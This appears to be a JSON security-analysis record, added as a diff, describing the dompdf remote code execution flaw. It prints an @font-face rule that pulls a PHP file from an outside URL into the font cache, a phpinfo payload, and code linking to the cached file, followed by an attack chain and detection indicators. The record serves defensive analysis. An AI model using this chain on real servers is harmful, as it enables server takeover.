@@ -1,0 +1,133 @@
+{
+  "package_info": {
+    "package_name": "dompdf",
+    "package_manager": "composer",
+    "package_versions": "all versions (especially <0.8.5 and >=0.8.6 with $isRemoteEnabled enabled)",
+    "why_malicious": "The dompdf package is not intentionally malicious, but it contains a critical remote code execution (RCE) vulnerability. Attackers can exploit the font caching mechanism by supplying a remote font file containing PHP code via a @font-face CSS rule. The font file is downloaded and cached with a .php extension in a web-accessible directory, allowing attackers to execute arbitrary PHP code on the server by accessing the file via HTTP."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "During PDF generation, when dompdf processes HTML/CSS input containing an external @font-face rule",
+        "file_location": "HTML/CSS input processed by dompdf (user-supplied or attacker-controlled HTML/CSS)",
+        "required_permissions": [
+          "network",
+          "filesystem"
+        ]
+      },
+      "code_snippet": "@font-face {\n    font-family:'gotcha';\n    src:url('https://github.com/snyk-labs/php-goof/blob/main/exploits/gotcha_font.php?raw=true');\n    font-weight:'normal';\n    font-style:'normal';\n  }",
+      "code_language": "css",
+      "code_behavior": "During PDF generation, the code instructs dompdf to download a remote font file from an attacker-controlled URL, dompdf saves the file with a .php extension in its font cache directory, resulting in a web-accessible PHP file that can be executed, enabling remote code execution.",
+      "malice_analysis": {
+        "why_suspicious": "Allowing user-supplied CSS to load remote font files from arbitrary URLs is highly suspicious, especially when the downloaded file is saved with a .php extension in a web-accessible directory.",
+        "violated_expectations": "Normally, font files should be validated, sanitized, and stored securely as non-executable files. Storing unvalidated remote files as .php in a web-accessible directory violates secure coding practices and enables code execution.",
+        "similar_legitimate_use": "Legitimate use involves loading trusted font files for rendering, but never from untrusted or attacker-controlled sources, and never as executable files.",
+        "key_indicators": [
+          "Remote font file loaded from attacker-controlled URL via @font-face",
+          "Font file saved with .php extension in dompdf's font cache directory",
+          "No validation or sanitization of font file content"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "When the cached font file is accessed via HTTP, after PDF generation and font caching",
+        "file_location": "Font file (gotcha_font.php) stored in dompdf's font cache directory (e.g., vendor/dompdf/dompdf/lib/fonts/)",
+        "required_permissions": [
+          "filesystem",
+          "php execution"
+        ]
+      },
+      "code_snippet": "<?php phpinfo(); ?>",
+      "code_language": "php",
+      "code_behavior": "When the cached font file is accessed via an HTTP request, the web server executes the embedded PHP code, resulting in arbitrary code execution on the server, such as displaying phpinfo or running attacker-supplied commands.",
+      "malice_analysis": {
+        "why_suspicious": "Font files should never contain executable PHP code. The presence of PHP code in a font file that is web-accessible and executable is a clear indicator of exploitation and a severe security risk.",
+        "violated_expectations": "Font files are expected to be binary data (e.g., .ttf, .woff), not scripts. Storing and executing PHP code from a font file is a critical violation of security best practices.",
+        "similar_legitimate_use": "There is no legitimate reason for a font file to contain PHP code or for a font file to be executable by the web server.",
+        "key_indicators": [
+          "PHP code embedded in a file with a .php extension in the font cache directory",
+          "Font file accessible via HTTP and executed by the web server",
+          "Execution of arbitrary PHP code from a file not part of the application source"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_3",
+      "execution_context": {
+        "trigger": "At runtime, after the font is cached, when application code generates a link to the cached font file",
+        "file_location": "Application code (e.g., php-goof demo) that locates the cached font file and exposes its path",
+        "required_permissions": [
+          "filesystem",
+          "network"
+        ]
+      },
+      "code_snippet": "if($font = $dompdf->getFontMetrics()->getFont(\"gotcha\", \"normal\")){\n    $html .= \"<a href='http://\".$_SERVER['SERVER_NAME'].\":\".$_SERVER['SERVER_PORT'].\"/vendor/dompdf/dompdf/lib/fonts/\".basename($font).\".php'>Gotcha hack</a>\";\n}",
+      "code_language": "php",
+      "code_behavior": "At runtime, after the font is cached, the code locates the cached font file and dynamically generates a hyperlink to it, exposing the web-accessible path to the malicious PHP file, which enables an attacker to trigger remote code execution by visiting the link.",
+      "malice_analysis": {
+        "why_suspicious": "Exposing the path to a web-accessible, attacker-controlled PHP file is highly suspicious and directly facilitates exploitation by making it easy to trigger code execution.",
+        "violated_expectations": "Application code should not expose internal file paths, especially to executable files in web-accessible locations. This behavior increases the risk of exploitation.",
+        "similar_legitimate_use": "Debugging or development tools might expose file paths, but never to executable files or in production environments.",
+        "key_indicators": [
+          "Dynamic generation of hyperlinks to internal PHP files in the font cache directory",
+          "Exposure of web-accessible paths to attacker-controlled files",
+          "Facilitation of remote code execution by making the malicious file easily accessible"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Attacker crafts a malicious font file containing embedded PHP code and hosts it at a remote URL.",
+      "implemented_by": [
+        "snippet_2"
+      ],
+      "leads_to": "Font file is referenced in CSS and loaded by dompdf."
+    },
+    {
+      "step": 2,
+      "action": "Attacker injects a @font-face CSS rule referencing the malicious font file into HTML processed by dompdf.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "Dompdf downloads and caches the font file as a .php file in a web-accessible directory."
+    },
+    {
+      "step": 3,
+      "action": "Application code (or attacker) locates the cached font file and generates a link to it, exposing the path.",
+      "implemented_by": [
+        "snippet_3"
+      ],
+      "leads_to": "Attacker can access the file via HTTP."
+    },
+    {
+      "step": 4,
+      "action": "Attacker accesses the cached font file via HTTP, triggering execution of the embedded PHP code on the server.",
+      "implemented_by": [
+        "snippet_2"
+      ],
+      "leads_to": "Remote code execution on the server (final goal)."
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "Loading of remote font files from untrusted or attacker-controlled URLs during PDF generation",
+      "Creation of font files with .php extension in dompdf's font cache directory",
+      "Execution of PHP code from files in dompdf/lib/fonts/ or similar cache directories that are not part of the application source"
+    ],
+    "file_indicators": [
+      "Font files with .php extension in vendor/dompdf/dompdf/lib/fonts/ or equivalent cache directories",
+      "Presence of PHP code (e.g., '<?php') inside files in the font cache directory",
+      "Unexpected new .php files appearing in dompdf's font cache directory"
+    ],
+    "network_indicators": [
+      "Outbound HTTP(S) requests from the server to untrusted or attacker-controlled domains for font files during PDF generation",
+      "Unusual font file downloads initiated by dompdf, especially from non-whitelisted domains"
+    ],
+    "how_to_detect": "Monitor for the creation of .php files in dompdf's font cache directory, especially those containing PHP code. Alert on outbound HTTP(S) requests to untrusted domains for font files during PDF generation. Scan font cache directories for files containing PHP code. Restrict web access and disable PHP execution in dompdf's font cache directories. Use application firewalls to block HTTP requests to vendor/dompdf/dompdf/lib/fonts/*.php and monitor for suspicious file creation or access patterns."
+  }
+}
